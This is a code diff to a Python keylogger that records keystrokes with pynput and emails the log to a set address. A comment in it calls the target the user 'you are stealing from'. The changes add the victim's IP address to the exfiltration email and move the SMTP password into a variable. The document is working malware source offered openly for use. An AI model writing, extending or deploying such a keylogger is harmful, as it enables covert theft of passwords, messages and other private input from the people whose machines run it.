@@ -1,16 +1,16 @@
 from pynput.keyboard import Listener
-import logging, smtplib, getpass, time, threading
+import logging, smtplib, getpass, time, threading, schedule, socket
 from email.mime.multipart import MIMEMultipart 
 from email.mime.text import MIMEText 
 from email.mime.base import MIMEBase 
 from email import encoders 
 from datetime import datetime
-import schedule
 
 log_dir = ""
 logged = []
 fromaddr = "test@gmail.com"
 toaddr = "test@gmail.com"
+password = "password"
 
 # Set formatting for the log file
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
@@ -31,7 +31,7 @@ def sendMail():
     msg['Subject'] = str(datetime.now().strftime("%m/%d/%Y %H:%M")) + " - KeyLogging Dump for User: " + getpass.getuser() # Add dynamic date/user you are stealing from
     
     # string to store the body of the mail
-    body = "See Attachment"
+    body = "See Attachment\nIP Address:" + socket.gethostbyname(socket.gethostname())
     
     # attach the body with the msg instance
     msg.attach(MIMEText(body, 'plain'))
@@ -61,7 +61,7 @@ def sendMail():
     s.starttls()
     
     # Authentication
-    s.login(fromaddr, "password")
+    s.login(fromaddr, password)
     
     # Converts the Multipart msg into a string
     text = msg.as_string()
